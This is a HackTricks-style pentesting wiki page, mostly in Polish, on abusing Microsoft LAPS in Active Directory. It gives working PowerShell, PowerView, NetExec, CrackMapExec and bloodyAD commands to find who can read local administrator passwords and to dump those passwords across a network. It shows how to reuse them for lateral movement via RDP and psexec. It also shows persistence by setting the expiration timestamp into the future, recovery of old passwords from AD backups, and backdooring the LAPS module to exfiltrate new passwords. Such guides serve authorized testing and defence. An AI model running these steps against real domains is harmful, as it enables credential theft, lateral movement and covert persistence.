# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Obecnie podczas assessment możesz spotkać **2 odmiany LAPS**:

- **Legacy Microsoft LAPS**: przechowuje hasło lokalnego administratora w **`ms-Mcs-AdmPwd`** oraz czas wygaśnięcia w **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (wbudowany w Windows od aktualizacji z kwietnia 2023): nadal może emulować tryb legacy, ale w natywnym trybie używa atrybutów **`msLAPS-*`**, obsługuje **password encryption**, **password history** oraz **DSRM password backup** dla kontrolerów domeny.

LAPS został zaprojektowany do zarządzania **local administrator passwords**, czyniąc je **unikalnymi, losowymi i często zmienianymi** na komputerach dołączonych do domeny. Jeśli możesz odczytać te atrybuty, zwykle możesz **pivot as the local admin** na podatnym hoście. W wielu środowiskach interesujące jest nie tylko odczytanie samego hasła, ale także ustalenie **komu delegowano dostęp** do atrybutów hasła.

### Legacy Microsoft LAPS attributes

W obiektach komputerów w domenie implementacja legacy Microsoft LAPS powoduje dodanie dwóch atrybutów:

- **`ms-Mcs-AdmPwd`**: **hasło administratora w postaci jawnego tekstu**
- **`ms-Mcs-AdmPwdExpirationTime`**: **czas wygaśnięcia hasła**

### Windows LAPS attributes

Natywny Windows LAPS dodaje kilka nowych atrybutów do obiektów komputerów:

- **`msLAPS-Password`**: blob hasła w postaci jawnego tekstu przechowywany jako JSON, gdy szyfrowanie nie jest włączone
- **`msLAPS-PasswordExpirationTime`**: zaplanowany czas wygaśnięcia
- **`msLAPS-EncryptedPassword`**: zaszyfrowane bieżące hasło
- **`msLAPS-EncryptedPasswordHistory`**: zaszyfrowana historia haseł
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: zaszyfrowane dane hasła DSRM dla kontrolerów domeny
- **`msLAPS-CurrentPasswordVersion`**: śledzenie wersji oparte na GUID używane przez nowszą logikę wykrywania rollbacku (Windows Server 2025 forest schema)

Gdy **`msLAPS-Password`** jest możliwy do odczytu, wartość jest obiektem JSON zawierającym nazwę konta, czas aktualizacji oraz hasło w postaci jawnego tekstu, na przykład:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Sprawdź, czy aktywowano
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Dostęp do hasła LAPS

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` i następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser), aby przekonwertować ten plik do czytelnego formatu.

### Legacy Microsoft LAPS PowerShell cmdlets

Jeśli legacy moduł LAPS jest zainstalowany, zwykle dostępne są następujące cmdlets:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS jest dostarczany z nowym modułem PowerShell i nowymi cmdletami:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText
```
Kilka szczegółów operacyjnych ma tu znaczenie:

- **`Get-LapsADPassword`** automatycznie obsługuje **legacy LAPS**, **clear-text Windows LAPS** oraz **encrypted Windows LAPS**.
- Jeśli password jest encrypted i możesz go **read**, ale nie **decrypt**ować, cmdlet zwraca metadane, ale nie zwraca clear-text password.
- **Password history** jest dostępna tylko wtedy, gdy włączone jest **Windows LAPS encryption**.
- Na domain controllers zwrócone źródło może być **`EncryptedDSRMPassword`**.

### PowerView / LDAP

**PowerView** może być też używany do ustalenia, **kto może read password i je read**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Jeśli **`msLAPS-Password`** jest czytelny, sparsuj zwrócony JSON i wyodrębnij **`p`** dla hasła oraz **`n`** dla nazwy zarządzanego lokalnego konta administratora.

### Linux / remote tooling

Nowoczesne narzędzia wspierają zarówno legacy Microsoft LAPS, jak i Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Uwagi:

- Nowsze buildy **NetExec** obsługują **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** oraz **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** nadal jest przydatny dla **legacy Microsoft LAPS** z Linuksa, ale obsługuje tylko **`ms-Mcs-AdmPwd`**.
- Jeśli środowisko używa **encrypted Windows LAPS**, samo odczytanie LDAP nie wystarczy; musisz też być **authorized decryptor** albo wykorzystać wspieraną ścieżkę decrypt.

### Directory synchronization abuse

Jeśli masz na poziomie domeny uprawnienia **directory synchronization** zamiast bezpośredniego dostępu do odczytu na każdym obiekcie komputera, LAPS nadal może być interesujący.

Połączenie **`DS-Replication-Get-Changes`** z **`DS-Replication-Get-Changes-In-Filtered-Set`** lub **`DS-Replication-Get-Changes-All`** może być użyte do synchronizacji atrybutów **confidential / RODC-filtered** takich jak legacy **`ms-Mcs-AdmPwd`**. BloodHound modeluje to jako **`SyncLAPSPassword`**. Zobacz [DCSync](dcsync.md), aby poznać tło uprawnień replikacji.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia enumerację LAPS dzięki kilku funkcjom.\
Jedną z nich jest parsowanie **`ExtendedRights`** dla **all computers with LAPS enabled.** Pokazuje to **groups** konkretnie **delegated to read LAPS passwords**, które często są użytkownikami w protected groups.\
**Account**, który **joined a computer** to a domain, otrzymuje `All Extended Rights` na tym hoście, a to uprawnienie daje **account** możliwość **read passwords**. Enumeracja może pokazać konto użytkownika, które może odczytać hasło LAPS na hoście. Może nam to pomóc **target specific AD users** who can read LAPS passwords.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Zrzucanie haseł LAPS za pomocą NetExec / CrackMapExec

Jeśli nie masz interaktywnego PowerShell, możesz nadużyć tego uprawnienia zdalnie przez LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
To zrzuca wszystkie sekrety LAPS, które użytkownik może odczytać, umożliwiając późniejsze przemieszczanie się lateralne z innym hasłem lokalnego administratora.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### Data wygaśnięcia

Po uzyskaniu uprawnień admin, możliwe jest **pozyskanie haseł** i **uniemożliwienie** maszynie **aktualizacji** jej **hasła** poprzez **ustawienie daty wygaśnięcia w przyszłości**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS używa zamiast tego **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> Hasło nadal zostanie zmienione, jeśli **admin** użyje **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, lub jeśli włączona jest opcja **Do not allow password expiration time longer than required by policy**.

### Odzyskiwanie historycznych haseł z kopii zapasowych AD

Gdy włączone jest **Windows LAPS encryption + password history**, zamontowane kopie zapasowe AD mogą stać się dodatkowym źródłem sekretów. Jeśli możesz uzyskać dostęp do zamontowanego snapshotu AD i użyć **recovery mode**, możesz odpytywać starsze zapisane hasła bez komunikacji z działającym DC.
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Jest to głównie istotne podczas **AD backup theft**, **offline forensics abuse** lub **disaster-recovery media access**.

### Backdoor

Oryginalny kod źródłowy legacy Microsoft LAPS można znaleźć [here](https://github.com/GreyCorbel/admpwd), dlatego możliwe jest umieszczenie backdoor w kodzie (na przykład wewnątrz metody `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs`), który w jakiś sposób **exfiltrate new passwords or store them somewhere**.

Następnie skompiluj nowe `AdmPwd.PS.dll` i wgraj je na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (oraz zmień czas modyfikacji).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
